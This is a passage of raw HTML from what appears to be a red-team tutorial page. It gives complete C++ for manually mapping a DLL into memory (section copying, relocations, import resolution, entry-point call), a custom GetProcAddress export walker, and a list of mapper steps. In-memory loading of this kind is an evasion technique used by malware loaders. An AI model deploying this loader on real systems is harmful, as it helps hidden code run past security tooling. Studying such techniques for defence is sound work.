text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_2l8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">#include "pch.h"<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#include &lt;iostream&gt;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#include &lt;Windows.h&gt;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">typedef struct BASE_RELOCATION_BLOCK {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	DWORD PageAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	DWORD BlockSize;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">typedef struct BASE_RELOCATION_ENTRY {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	USHORT Offset : 12;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	USHORT Type : 4;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">using DLLEntry = BOOL(WINAPI *)(HINSTANCE dll, DWORD reason, LPVOID reserved);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">int main()<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	// get this module's image base address<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	PVOID imageBase = GetModuleHandleA(NULL);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">	// load DLL into memory<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	HANDLE dll = CreateFileA("\\\\VBOXSVR\\Experiments\\MLLoader\\MLLoader\\x64\\Debug\\dll.dll", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	DWORD64 dllSize = GetFileSize(dll, NULL);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	DWORD outSize = 0; <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	ReadFile(dll, dllBytes, dllSize, &amp;outSize, NULL);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">	// get pointers to in-memory DLL headers<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders-&gt;e_lfanew);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	SIZE_T dllImageSize = ntHeaders-&gt;OptionalHeader.SizeOfImage;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">	// allocate new memory space for the DLL. Try to allocate memory in the image's preferred base address, but don't stress if the memory is allocated elsewhere<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	//LPVOID dllBase = VirtualAlloc((LPVOID)0x000000191000000, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders-&gt;OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	// get delta between this module's image base and the DLL that was read into memory<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders-&gt;OptionalHeader.ImageBase;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">	// copy over DLL image headers to the newly allocated space for the DLL<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	std::memcpy(dllBase, dllBytes, ntHeaders-&gt;OptionalHeader.SizeOfHeaders);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">	// copy over DLL image sections to the newly allocated space for the DLL<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	for (size_t i = 0; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section-&gt;VirtualAddress);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section-&gt;PointerToRawData);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		std::memcpy(sectionDestination, sectionBytes, section-&gt;SizeOfRawData);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		section++;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">	// perform image base relocations<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	IMAGE_DATA_DIRECTORY relocations = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	DWORD relocationsProcessed = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">	while (relocationsProcessed &lt; relocations.Size) <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		DWORD relocationsCount = (relocationBlock-&gt;BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">		for (DWORD i = 0; i &lt; relocationsCount; i++)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">			if (relocationEntries[i].Type == 0)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">				continue;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">			DWORD_PTR relocationRVA = relocationBlock-&gt;PageAddress + relocationEntries[i].Offset;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			DWORD_PTR addressToPatch = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR), NULL);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			addressToPatch += deltaImageBase;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			std::memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	// resolve import address table<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	LPCSTR libraryName = "";<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	HMODULE library = NULL;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">	while (importDescriptor-&gt;Name != NULL)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		libraryName = (LPCSTR)importDescriptor-&gt;Name + (DWORD_PTR)dllBase;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		library = LoadLibraryA(libraryName);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		if (library)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			PIMAGE_THUNK_DATA thunk = NULL;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor-&gt;FirstThunk);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">			while (thunk-&gt;u1.AddressOfData != NULL)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">				if (IMAGE_SNAP_BY_ORDINAL(thunk-&gt;u1.Ordinal))<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">				{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk-&gt;u1.Ordinal);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">					thunk-&gt;u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">				}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">				else<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">				{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk-&gt;u1.AddressOfData);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">					DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName-&gt;Name);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">					thunk-&gt;u1.Function = functionAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">				}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">				++thunk;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">		importDescriptor++;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">	// execute the loaded DLL<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase + ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">	CloseHandle(dll);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	HeapFree(GetProcessHeap(), 0, dllBytes);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">	return 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><hr class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 page-width-wide:max-w-full border-tint-subtle"><h3 id="a-custom-getprocaddress" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#a-custom-getprocaddress"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_ap8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_ap8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">A Custom GetProcAddress</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Since the OS loader didn’t register your mapped image like a normal module, you’ll want a tiny export walker over <strong class="font-bold">your</strong> base: read <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">IMAGE_EXPORT_DIRECTORY</code>, find the name, convert RVA → VA, return the pointer. Nothing fancy—just reliable.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_2t8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">void* GetExport(const HMODULE&amp; mod, const char* name) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (!mod.base) return nullptr;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    auto base = (uint8_t*)mod.base;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    auto dos = (PIMAGE_DOS_HEADER)base;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    auto nt = (PIMAGE_NT_HEADERS)(base + dos-&gt;e_lfanew);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    auto&amp; dir = nt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (!dir.VirtualAddress || !dir.Size) return nullptr;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    auto ed = (PIMAGE_EXPORT_DIRECTORY)(base + dir.VirtualAddress);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    auto names = (DWORD*)(base + ed-&gt;AddressOfNames);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    auto ords = (WORD*)(base + ed-&gt;AddressOfNameOrdinals);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    auto funs = (DWORD*)(base + ed-&gt;AddressOfFunctions);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    for (DWORD i = 0; i &lt; ed-&gt;NumberOfNames; ++i) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        const char* nm = (const char*)(base + names[i]);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        if (_stricmp(nm, name) == 0) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            WORD ord = ords[i];<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            DWORD rva = funs[ord];<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            return (void*)(base + rva);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    return nullptr;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><hr class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 page-width-wide:max-w-full border-tint-subtle"><h3 id="mapper" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#mapper"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_b18qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_b18qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Mapper</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">A neat mapper returns the mapped base (your stand-in for <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">HMODULE</code>). It should:</p><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Validate DOS/NT headers</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Allocate <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">SizeOfImage</code></p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Copy headers + sections</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Apply relocations<!-- --></p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Resolve imports</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Set final protections</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Optionally flush the instruction cache</p></div></li></ul><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px 